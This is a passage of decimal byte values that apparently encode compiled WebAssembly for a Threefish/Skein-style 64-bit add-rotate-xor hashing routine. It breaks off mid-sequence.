170,213,0,131,132,34,32,66,127,133,131,133,34,48,131,32,27,133,33,44,32,30,32,25,32,34,32,46,133,34,49,66,127,133,34,34,131,133,33,30,32,48,32,32,32,38,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,38,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,48,66,127,133,34,46,131,133,33,27,32,25,32,37,66,127,133,131,34,51,32,34,133,34,56,32,37,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,54,32,47,133,32,29,131,32,26,133,34,29,133,32,50,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,52,133,34,43,133,34,26,32,53,133,34,42,32,31,32,39,133,34,31,32,36,133,32,63,32,45,131,133,34,28,32,35,133,32,60,66,2,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,55,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,39,32,28,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,28,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,36,32,33,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,33,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,26,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,43,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,29,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,47,66,127,133,34,50,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,54,32,26,32,36,66,127,133,131,34,55,32,50,133,34,50,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,61,133,33,33,32,37,32,44,133,32,58,32,48,133,32,27,131,32,32,133,34,27,133,32,51,32,49,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,48,133,34,32,32,57,133,34,38,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,27,133,34,25,66,127,133,131,133,34,37,131,32,41,133,33,41,32,30,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,30,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,40,32,34,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,34,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,30,32,32,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,32,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,32,66,127,133,131,133,34,49,131,32,30,133,33,44,32,37,32,25,32,34,32,48,133,34,48,66,127,133,34,34,131,133,33,30,32,49,32,32,32,27,66,2,134,66,204,153,179,230,204,153,179,230,76,131,32,27,66,2,136,66,179,230,204,153,179,230,204,153,51,131,132,34,49,66,127,133,34,46,131,133,33,27,32,25,32,38,66,127,133,131,34,51,32,34,133,34,56,32,38,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,29,133,32,52,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,43,133,34,26,32,54,133,34,42,32,31,32,39,133,34,31,32,36,133,32,61,32,45,131,133,34,28,32,35,133,32,60,66,3,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,50,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,39,32,28,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,28,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,36,32,33,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,33,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,26,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,43,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,29,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,47,66,127,133,34,50,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,54,32,26,32,36,66,127,133,131,34,55,32,50,133,34,50,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,61,133,33,33,32,37,32,44,133,32,58,32,49,133,32,27,131,32,32,133,34,27,133,32,51,32,48,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,48,133,34,32,32,57,133,34,38,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,27,133,34,25,66,127,133,131,133,34,37,131,32,41,133,33,41,32,30,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,30,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,40,32,34,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,34,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,30,32,32,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,32,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,32,66,127,133,131,133,34,49,131,32,30,133,33,44,32,37,32,25,32,34,32,48,133,34,48,66,127,133,34,34,131,133,33,30,32,49,32,32,32,27,66,4,134,66,240,225,195,135,143,158,188,248,112,131,32,27,66,4,136,66,143,158,188,248,240,225,195,135,15,131,132,34,49,66,127,133,34,46,131,133,33,27,32,25,32,38,66,127,133,131,34,51,32,34,133,34,56,32,38,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,29,133,32,52,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,43,133,34,26,32,54,133,34,42,32,31,32,39,133,34,31,32,36,133,32,61,32,45,131,133,34,28,32,35,133,32,60,66,4,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,50,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,39,32,28,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,28,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,36,32,33,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,33,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,26,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,43,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,29,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,47,66,127,133,34,50,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,54,32,26,32,36,66,127,133,131,34,55,32,50,133,34,50,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,61,133,33,33,32,37,32,44,133,32,58,32,49,133,32,27,131,32,32,133,34,27,133,32,51,32,48,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,48,133,34,32,32,57,133,34,38,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,27,133,34,25,66,127,133,131,133,34,37,131,32,41,133,33,41,32,30,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,30,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,40,32,34,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,34,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,30,32,32,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,32,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,32,66,127,133,131,133,34,49,131,32,30,133,33,44,32,37,32,25,32,34,32,48,133,34,48,66,127,133,34,34,131,133,33,30,32,49,32,32,32,27,66,8,134,66,128,254,131,248,143,224,191,128,127,131,32,27,66,8,136,66,255,129,252,135,240,159,192,255,0,131,132,34,49,66,127,133,34,46,131,133,33,27,32,25,32,38,66,127,133,131,34,51,32,34,133,34,56,32,38,32,30,32,25,131,133,34,38,132,32,30,133,34,37,32,41,131,32,38,133,34,57,32,32,32,40,66,127,133,131,34,58,32,46,133,34,46,32,27,32,32,131,32,40,133,34,40,132,32,27,133,34,59,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,29,133,32,52,32,43,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,43,133,34,26,32,54,133,34,42,32,31,32,39,133,34,31,32,36,133,32,61,32,45,131,133,34,28,32,35,133,32,60,66,5,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,39,32,33,32,31,133,32,35,32,50,133,32,29,32,36,131,133,34,29,133,34,31,66,127,133,131,133,34,35,131,32,39,133,33,36,32,28,66,16,134,66,128,128,252,255,143,128,64,131,32,28,66,16,136,66,255,255,131,128,240,255,63,131,132,34,39,32,33,66,16,134,66,128,128,252,255,143,128,64,131,32,33,66,16,136,66,255,255,131,128,240,255,63,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,16,134,66,128,128,252,255,143,128,64,131,32,26,66,16,136,66,255,255,131,128,240,255,63,131,132,34,26,66,127,133,131,133,34,47,131,32,28,133,33,45,32,35,32,31,32,33,32,43,133,34,50,66,127,133,34,33,131,133,33,28,32,47,32,26,32,29,66,16,134,66,128,128,252,255,143,128,64,131,32,29,66,16,136,66,255,255,131,128,240,255,63,131,132,34,47,66,127,133,34,43,131,133,33,29,32,31,32,42,66,127,133,131,34,52,32,33,133,34,53,32,42,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,36,131,32,42,133,34,54,32,26,32,39,66,127,133,131,34,55,32,43,133,34,61,32,29,32,26,131,32,39,133,34,43,132,32,29,133,34,62,133,33,33,32,37,32,44,133,32,58,32,49,133,32,27,131,32,32,133,34,27,133,32,51,32,48,133,32,30,131,32,25,133,34,25,32,38,131,32,56,133,34,38,133,34,32,32,57,133,34,39,32,25,32,41,133,34,25,32,40,133,32,59,32,44,131,133,34,30,32,37,133,32,0,65,5,116,65,184,63,106,41,0,0,34,41,32,34,32,25,133,32,37,32,46,133,32,27,32,40,131,133,34,37,133,34,25,66,127,133,131,133,34,27,131,32,41,133,33,40,32,30,66,16,134,66,128,128,252,255,143,128,64,131,32,30,66,16,136,66,255,255,131,128,240,255,63,131,132,34,41,32,34,66,16,134,66,128,128,252,255,143,128,64,131,32,34,66,16,136,66,255,255,131,128,240,255,63,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,44,32,32,66,16,134,66,128,128,252,255,143,128,64,131,32,32,66,16,136,66,255,255,131,128,240,255,63,131,132,34,30,66,127,133,131,133,34,32,131,32,44,133,33,44,32,27,32,25,32,34,32,38,133,34,46,66,127,133,34,34,131,133,33,27,32,32,32,30,32,37,66,16,134,66,128,128,252,255,143,128,64,131,32,37,66,16,136,66,255,255,131,128,240,255,63,131,132,34,51,66,127,133,34,32,131,133,33,38,32,25,32,39,66,127,133,131,34,56,32,34,133,34,57,32,39,32,27,32,25,131,133,34,48,132,32,27,133,34,39,32,40,131,32,48,133,34,58,32,30,32,41,66,127,133,131,34,59,32,32,133,34,63,32,38,32,30,131,32,41,133,34,49,132,32,38,133,34,64,133,33,34,32,35,32,45,133,32,55,32,47,133,32,29,131,32,26,133,34,37,133,32,52,32,50,133,32,28,131,32,31,133,34,31,32,42,131,32,53,133,34,29,133,34,26,32,54,133,34,32,32,31,32,36,133,34,31,32,43,133,32,62,32,45,131,133,34,28,32,35,133,32,60,66,6,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,41,32,33,32,31,133,32,35,32,61,133,32,37,32,43,131,133,34,37,133,34,31,66,127,133,131,133,34,36,131,32,41,133,33,35,32,28,66,32,134,32,28,66,32,136,132,34,41,32,33,66,32,134,32,33,66,32,136,132,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,26,66,32,134,32,26,66,32,136,132,34,26,66,127,133,131,133,34,45,131,32,28,133,33,42,32,36,32,31,32,33,32,29,133,34,36,66,127,133,34,29,131,133,33,33,32,45,32,26,32,37,66,32,134,32,37,66,32,136,132,34,45,66,127,133,34,43,131,133,33,28,32,31,32,32,66,127,133,131,34,47,32,29,133,34,50,32,32,32,33,32,31,131,133,34,37,132,32,33,133,34,29,32,35,131,32,37,133,34,52,32,26,32,41,66,127,133,131,34,53,32,43,133,34,43,32,28,32,26,131,32,41,133,34,41,132,32,28,133,34,54,133,33,32,32,29,32,42,133,32,53,32,45,133,32,28,131,32,26,133,34,26,133,32,47,32,36,133,32,33,131,32,31,133,34,31,32,37,131,32,50,133,34,36,133,33,37,32,31,32,35,133,34,35,32,41,133,32,54,32,42,131,133,34,31,32,29,133,33,28,32,37,32,52,133,33,33,32,32,32,35,133,32,29,32,43,133,32,26,32,41,131,133,34,41,133,33,29,32,32,32,36,133,33,42,32,39,32,44,133,32,59,32,51,133,32,38,131,32,30,133,34,26,133,32,56,32,46,133,32,27,131,32,25,133,34,27,32,48,131,32,57,133,34,38,133,34,25,32,58,133,34,30,32,27,32,40,133,34,35,32,49,133,32,64,32,44,131,133,34,27,32,39,133,32,0,65,5,116,65,184,63,106,41,0,0,34,36,32,34,32,35,133,32,39,32,63,133,32,26,32,49,131,133,34,35,133,34,26,66,127,133,131,133,34,40,131,32,36,133,33,39,32,27,66,32,134,32,27,66,32,136,132,34,36,32,34,66,32,134,32,34,66,32,136,132,32,0,65,5,116,65,200,63,106,41,0,0,34,27,32,25,66,32,134,32,25,66,32,136,132,34,25,66,127,133,131,133,34,44,131,32,27,133,33,45,32,40,32,26,32,34,32,38,133,34,40,66,127,133,34,38,131,133,33,34,32,44,32,25,32,35,66,32,134,32,35,66,32,136,132,34,44,66,127,133,34,43,131,133,33,27,32,26,32,30,66,127,133,131,34,48,32,38,133,34,49,32,30,32,34,32,26,131,133,34,35,132,32,34,133,34,38,32,39,131,32,35,133,34,46,32,25,32,36,66,127,133,131,34,51,32,43,133,34,43,32,27,32,25,131,32,36,133,34,36,132,32,27,133,34,47,133,33,30,32,38,32,45,133,32,51,32,44,133,32,27,131,32,25,133,34,27,133,32,48,32,40,133,32,34,131,32,26,133,34,34,32,35,131,32,49,133,34,40,133,33,35,32,34,32,39,133,34,39,32,36,133,32,47,32,45,131,133,34,26,32,38,133,33,25,32,35,32,46,133,33,34,32,30,32,39,133,32,38,32,43,133,32,27,32,36,131,133,34,39,133,33,27,32,30,32,40,133,33,38,32,60,66,7,124,34,60,66,42,84,13,0,11,32,1,32,28,55,3,0,32,5,32,33,55,3,0,32,3,32,30,55,3,0,32,7,32,26,55,3,0,32,2,32,25,55,3,0,32,4,32,32,55,3,0,32,6,32,34,55,3,0,32,8,32,31,55,3,0,32,23,32,9,41,3,0,32,29,133,55,3,0,32,19,32,10,41,3,0,32,27,133,55,3,0,32,24,32,11,41,3,0,32,35,133,55,3,0,32,20,32,12,41,3,0,32,37,133,55,3,0,32,21,32,13,41,3,0,32,42,133,55,3,0,32,17,32,14,41,3,0,32,38,133,55,3,0,32,22,32,15,41,3,0,32,39,133,55,3,0,32,18,32,16,41,3,0,32,41,133,55,3,0,11,179,52,2,9,127,42,126,32,3,173,33,44,32,2,65,127,106,173,33,45,32,0,65,8,106,34,4,41,3,0,34,46,33,36,32,0,65,16,106,34,5,41,3,0,33,34,32,0,65,208,0,106,34,6,41,3,0,33,26,32,0,65,200,0,106,34,7,41,3,0,33,25,32,0,65,192,0,106,34,8,41,3,0,33,24,32,0,65,56,106,34,9,41,3,0,33,27,32,0,65,48,106,34,10,41,3,0,33,28,32,0,65,40,106,34,11,41,3,0,33,29,32,0,65,32,106,34,12,41,3,0,33,30,32,0,65,24,106,34,3,41,3,0,33,31,3,64,32,36,32,44,124,34,36,32,34,133,33,35,32,1,65,192,0,106,33,0,32,1,41,0,0,34,47,32,31,124,32,1,41,0,8,34,48,32,30,124,34,13,124,33,21,32,1,41,0,48,34,49,32,34,32,25,124,34,37,124,32,1,41,0,56,34,50,32,26,124,34,17,124,33,22,32,1,41,0,16,34,51,32,29,124,32,1,41,0,24,34,52,32,28,124,34,14,124,34,16,32,13,66,46,134,32,13,66,18,136,132,32,21,133,34,20,124,33,19,32,17,66,37,134,32,17,66,27,136,132,32,22,133,34,18,32,1,41,0,32,34,53,32,27,124,32,1,41,0,40,34,54,32,36,32,24,124,34,38,124,34,15,124,34,17,124,33,13,32,14,66,36,134,32,14,66,28,136,132,32,16,133,34,14,32,21,124,33,33,32,18,66,27,134,32,18,66,37,136,132,32,13,133,34,23,32,19,124,33,21,32,13,32,20,66,33,134,32,20,66,31,136,132,32,19,133,34,16,124,34,13,32,16,66,17,134,32,16,66,47,136,132,133,34,18,32,15,66,19,134,32,15,66,45,136,132,32,17,133,34,15,32,22,124,34,16,32,14,66,42,134,32,14,66,22,136,132,32,33,133,34,14,124,34,17,124,33,20,32,13,32,14,66,49,134,32,14,66,15,136,132,32,17,133,34,19,124,33,22,32,23,66,39,134,32,23,66,25,136,132,32,21,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,33,124,34,16,124,34,17,32,30,124,32,18,66,44,134,32,18,66,20,136,132,32,20,133,32,29,124,34,13,124,33,18,32,20,32,35,32,26,124,34,39,124,32,26,66,162,180,240,207,170,251,198,232,27,133,32,25,133,32,24,133,32,27,133,32,28,133,32,29,133,32,30,133,32,31,133,34,32,66,1,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,23,32,13,66,39,134,32,13,66,25,136,132,32,18,133,34,20,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,21,124,34,16,32,28,124,32,19,66,56,134,32,19,66,8,136,132,32,22,133,32,27,124,34,13,124,34,17,124,33,19,32,18,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,18,124,33,21,32,14,66,24,134,32,14,66,40,136,132,32,23,133,34,14,32,22,32,24,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,37,124,34,15,124,34,16,124,34,17,32,20,66,13,134,32,20,66,51,136,132,32,19,133,34,13,124,33,20,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,25,134,32,13,66,39,136,132,32,20,133,34,19,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,17,134,32,18,66,47,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,23,32,14,66,43,134,32,14,66,21,136,132,32,22,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,29,124,32,19,66,8,134,32,19,66,56,136,132,32,18,133,32,28,124,34,13,124,33,19,32,18,32,32,32,36,124,34,40,124,32,31,66,2,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,21,32,13,66,46,134,32,13,66,18,136,132,32,19,133,34,18,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,22,124,34,16,32,27,124,32,20,66,22,134,32,20,66,42,136,132,32,23,133,32,24,124,34,13,124,34,17,124,33,20,32,19,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,19,124,33,22,32,14,66,37,134,32,14,66,27,136,132,32,21,133,34,14,32,23,32,25,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,39,124,34,15,124,34,16,124,34,17,32,18,66,33,134,32,18,66,31,136,132,32,20,133,34,13,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,17,134,32,13,66,47,136,132,32,18,133,34,20,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,42,134,32,19,66,22,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,18,124,33,21,32,14,66,39,134,32,14,66,25,136,132,32,23,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,28,124,32,20,66,44,134,32,20,66,20,136,132,32,19,133,32,27,124,34,13,124,33,20,32,19,32,34,32,31,124,34,41,124,32,30,66,3,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,22,32,13,66,39,134,32,13,66,25,136,132,32,20,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,23,124,34,16,32,24,124,32,18,66,56,134,32,18,66,8,136,132,32,21,133,32,25,124,34,13,124,34,17,124,33,18,32,20,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,20,124,33,23,32,14,66,24,134,32,14,66,40,136,132,32,22,133,34,14,32,21,32,26,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,40,124,34,15,124,34,16,124,34,17,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,13,124,33,19,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,25,134,32,13,66,39,136,132,32,19,133,34,18,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,17,134,32,20,66,47,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,19,124,33,22,32,14,66,43,134,32,14,66,21,136,132,32,21,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,27,124,32,18,66,8,134,32,18,66,56,136,132,32,20,133,32,24,124,34,13,124,33,18,32,20,32,35,32,30,124,34,42,124,32,29,66,4,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,23,32,13,66,46,134,32,13,66,18,136,132,32,18,133,34,20,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,21,124,34,16,32,25,124,32,19,66,22,134,32,19,66,42,136,132,32,22,133,32,26,124,34,13,124,34,17,124,33,19,32,18,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,18,124,33,21,32,14,66,37,134,32,14,66,27,136,132,32,23,133,34,14,32,22,32,32,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,41,124,34,15,124,34,16,124,34,17,32,20,66,33,134,32,20,66,31,136,132,32,19,133,34,13,124,33,20,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,17,134,32,13,66,47,136,132,32,20,133,34,19,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,42,134,32,18,66,22,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,20,124,33,23,32,14,66,39,134,32,14,66,25,136,132,32,22,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,24,124,32,19,66,44,134,32,19,66,20,136,132,32,18,133,32,25,124,34,13,124,33,19,32,18,32,36,32,29,124,34,33,124,32,28,66,5,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,21,32,13,66,39,134,32,13,66,25,136,132,32,19,133,34,18,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,22,124,34,16,32,26,124,32,20,66,56,134,32,20,66,8,136,132,32,23,133,32,32,124,34,13,124,34,17,124,33,20,32,19,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,19,124,33,22,32,14,66,24,134,32,14,66,40,136,132,32,21,133,34,14,32,23,32,31,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,42,124,34,15,124,34,16,124,34,17,32,18,66,13,134,32,18,66,51,136,132,32,20,133,34,13,124,33,18,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,25,134,32,13,66,39,136,132,32,18,133,34,20,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,17,134,32,19,66,47,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,18,124,33,21,32,14,66,43,134,32,14,66,21,136,132,32,23,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,25,124,32,20,66,8,134,32,20,66,56,136,132,32,19,133,32,26,124,34,13,124,33,20,32,19,32,34,32,28,124,34,43,124,32,27,66,6,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,22,32,13,66,46,134,32,13,66,18,136,132,32,20,133,34,19,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,23,124,34,16,32,32,124,32,18,66,22,134,32,18,66,42,136,132,32,21,133,32,31,124,34,13,124,34,17,124,33,18,32,20,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,20,124,33,23,32,14,66,37,134,32,14,66,27,136,132,32,22,133,34,14,32,21,32,30,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,33,124,34,15,124,34,16,124,34,17,32,19,66,33,134,32,19,66,31,136,132,32,18,133,34,13,124,33,19,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,17,134,32,13,66,47,136,132,32,19,133,34,18,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,42,134,32,20,66,22,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,19,124,33,22,32,14,66,39,134,32,14,66,25,136,132,32,21,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,26,124,32,18,66,44,134,32,18,66,20,136,132,32,20,133,32,32,124,34,13,124,33,18,32,20,32,35,32,27,124,34,35,124,32,24,66,7,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,23,32,13,66,39,134,32,13,66,25,136,132,32,18,133,34,20,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,21,124,34,16,32,31,124,32,19,66,56,134,32,19,66,8,136,132,32,22,133,32,30,124,34,13,124,34,17,124,33,19,32,18,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,18,124,33,21,32,14,66,24,134,32,14,66,40,136,132,32,23,133,34,14,32,22,32,29,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,43,124,34,15,124,34,16,124,34,17,32,20,66,13,134,32,20,66,51,136,132,32,19,133,34,13,124,33,20,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,25,134,32,13,66,39,136,132,32,20,133,34,19,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,17,134,32,18,66,47,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,23,32,14,66,43,134,32,14,66,21,136,132,32,22,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,32,124,32,19,66,8,134,32,19,66,56,136,132,32,18,133,32,31,124,34,13,124,33,19,32,18,32,38,124,32,25,66,8,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,21,32,13,66,46,134,32,13,66,18,136,132,32,19,133,34,18,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,22,124,34,16,32,30,124,32,20,66,22,134,32,20,66,42,136,132,32,23,133,32,29,124,34,13,124,34,17,124,33,20,32,19,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,19,124,33,22,32,14,66,37,134,32,14,66,27,136,132,32,21,133,34,14,32,23,32,28,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,35,124,34,15,124,34,16,124,34,17,32,18,66,33,134,32,18,66,31,136,132,32,20,133,34,13,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,17,134,32,13,66,47,136,132,32,18,133,34,20,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,21,124,34,16,32,